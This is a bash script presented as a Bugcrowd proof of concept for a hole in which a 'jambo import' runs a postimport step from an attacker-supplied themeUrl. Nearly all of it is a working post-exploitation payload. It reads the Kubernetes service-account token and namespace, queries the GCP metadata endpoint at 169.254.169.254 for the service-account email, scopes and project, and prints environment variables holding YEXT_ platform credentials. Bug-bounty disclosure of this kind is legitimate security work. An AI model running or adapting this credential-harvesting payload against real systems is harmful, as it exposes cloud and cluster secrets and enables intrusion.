#!/bin/bash
# Bugcrowd PoC - jambo import executes postimport from an attacker-specified themeUrl.
# Prints identity and the credentials/identity reachable from the CBD session container.
echo "=== identity ==="; id; hostname; uname -a; pwd; date -u
echo "=== kubernetes service-account token ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo
echo "=== kubernetes namespace ==="
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null; echo
echo "=== GCP metadata identity (no access_token fetched) ==="
MD="http://169.254.169.254/computeMetadata/v1"
echo -n "sa email: "; curl -s -m 5 -H 'Metadata-Flavor: Google' "$MD/instance/service-accounts/default/email"; echo
echo "scopes:";     curl -s -m 5 -H 'Metadata-Flavor: Google' "$MD/instance/service-accounts/default/scopes"
echo -n "project: "; curl -s -m 5 -H 'Metadata-Flavor: Google' "$MD/project/project-id"; echo
echo "=== platform credentials in the process environment ==="
env | grep -E '^YEXT_' 
echo "=== DONE ==="
